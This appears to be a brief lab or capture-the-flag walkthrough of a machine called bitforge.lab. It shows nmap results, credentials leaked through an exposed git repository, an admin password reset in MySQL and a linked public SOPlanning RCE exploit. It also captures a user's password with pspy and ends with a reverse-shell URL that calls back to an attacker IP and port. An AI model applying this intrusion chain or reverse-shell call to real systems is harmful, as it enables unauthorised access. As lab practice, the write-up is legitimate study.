22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
80/tcp   open  http    Apache httpd
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://bitforge.lab/
| http-git: 
|   192.168.130.186:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: created .env to store the database configuration 
3306/tcp open  mysql   MySQL 8.0.40-0ubuntu0.24.04.1
| ssl-cert: Subject: commonName=MySQL_Server_8.0.40_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_8.0.40_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-01-15T14:38:11
| Not valid after:  2035-01-13T14:38:11
| MD5:   6ffd:19b3:1593:91e3:ca5f:95c7:4224:8213
|_SHA-1: 5a03:d302:2473:ec92:5347:eaca:48cf:80ea:90c3:2a64
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.40-0ubuntu0.24.04.1
|   Thread ID: 16
|   Capabilities flags: 65535
|   Some Capabilities: ODBCClient, LongPassword, ConnectWithDatabase, SupportsLoadDataLocal, Support41Auth, IgnoreSigpipes, Speaks41ProtocolOld, SupportsTransactions, FoundRows, SwitchToSSLAfterHandshake, LongColumnFlag, InteractiveClient, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, SupportsCompression, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x1B]&I\x1CW(\x141,,s*)}o\x0BHeX
|_  Auth Plugin Name: caching_sha2_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


port 80  
bitforge.lab
<img width="1238" height="671" alt="image" src="https://github.com/user-attachments/assets/5dce44e8-cb8d-4e4e-ac99-a2e34f2f8ca3" />

plan.bitforge.lab
<img width="1121" height="627" alt="image" src="https://github.com/user-attachments/assets/463eff38-b3b4-4d96-a925-fd89bf5b2113" />

creds for mysql?
$cfgUsername = 'BitForgeAdmin';
$cfgPassword = 'B1tForG3S0ftw4r3S0lutions';
<img width="742" height="210" alt="image" src="https://github.com/user-attachments/assets/fbb08f85-44a5-4666-b773-30df40689668" />

original admin admin password hash in github  
<img width="765" height="571" alt="image" src="https://github.com/user-attachments/assets/51f56c66-8a12-4d2b-b79b-30d9d6d5ef6f" />

change the password in sql  
<img width="1704" height="633" alt="image" src="https://github.com/user-attachments/assets/e3d36fee-b07a-4c2c-a5f8-8490c826cfae" />
<img width="1770" height="675" alt="image" src="https://github.com/user-attachments/assets/ca0fa7f0-f819-42f3-b68f-71874e34d1c8" />

rce  
https://github.com/theexploiters/CVE-2024-27115-Exploit/blob/main/SOPlanning-1.52.01-RCE-Exploit.py
<img width="1101" height="166" alt="image" src="https://github.com/user-attachments/assets/f582fee1-a789-4415-9931-e254c5697c2f" />

reverse shell
<img width="962" height="339" alt="image" src="https://github.com/user-attachments/assets/9b250778-a040-4601-95b7-dfaf454afc45" />

pspy jack password  
jack -p'j4cKF0rg3@445'
<img width="1241" height="82" alt="image" src="https://github.com/user-attachments/assets/585e7365-9e18-4363-8818-b900b1be3506" />


sudo -l can run a flask server internally on port 9000 
so i port forward using ssh -L  
go to flask folder location and edit the app.py  
<img width="842" height="588" alt="image" src="https://github.com/user-attachments/assets/fe98c42a-2229-470a-be63-45c17f6f4dca" />  

run the server  
<img width="984" height="147" alt="image" src="https://github.com/user-attachments/assets/de7f1e05-7975-4111-a5d5-b1042291e841" />

in firefox  
http://localhost:9000/reverse_shell?host=192.168.45.195&&port=80  
<img width="995" height="267" alt="image" src="https://github.com/user-attachments/assets/6d2ae0f6-451a-4c56-acfe-2e828a692ed8" />


